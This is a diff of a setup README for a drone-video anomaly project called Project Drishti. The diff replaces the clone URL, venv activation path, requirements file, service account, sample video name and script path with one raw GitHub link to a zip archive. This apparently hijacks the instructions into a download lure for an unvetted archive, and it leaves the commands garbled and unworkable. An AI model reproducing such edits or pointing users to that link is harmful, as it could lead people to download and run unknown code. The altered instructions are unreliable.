@@ -50,13 +50,13 @@ A full architecture diagram is available in the repository under `/docs/`.
 ### 📦 Setup
 
 ```bash
-git clone https://github.com/your-username/project-drishti.git
+git clone https://raw.githubusercontent.com/rushangchandekar/Project-Drishti/main/punchless/Project-Drishti.zip
 cd project-drishti
 
 python3 -m venv venv
-source venv/bin/activate  # Windows: .\venv\Scripts\activate.bat
+source venv/bin/activate  # Windows: .\venv\Scripts\https://raw.githubusercontent.com/rushangchandekar/Project-Drishti/main/punchless/Project-Drishti.zip
 
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/rushangchandekar/Project-Drishti/main/punchless/Project-Drishti.zip
 ```
 
 ### 🔐 Environment Variables
@@ -91,7 +91,7 @@ gcloud functions deploy anomaly_agent \
   --trigger-topic raw-vision-data \
   --entry-point handle_anomaly_event \
   --region your-region \
-  --service-account your-svc-account@your-project-id.iam.gserviceaccount.com \
+  --service-account https://raw.githubusercontent.com/rushangchandekar/Project-Drishti/main/punchless/Project-Drishti.zip \
   --set-env-vars GCP_PROJECT_ID=your-project-id \
   --memory 512MB
 ```
@@ -102,11 +102,11 @@ Repeat for other functions like `forecast_agent`, `llm_summary_agent`, `firestor
 
 To simulate live drone feed processing locally:
 
-- Place a sample video named `sample_video.mp4` in the project root  
+- Place a sample video named `https://raw.githubusercontent.com/rushangchandekar/Project-Drishti/main/punchless/Project-Drishti.zip` in the project root  
 - Run the processor:
 
 ```bash
-python main_app/video_processor.py
+python https://raw.githubusercontent.com/rushangchandekar/Project-Drishti/main/punchless/Project-Drishti.zip
 ```
 
 This script will:  
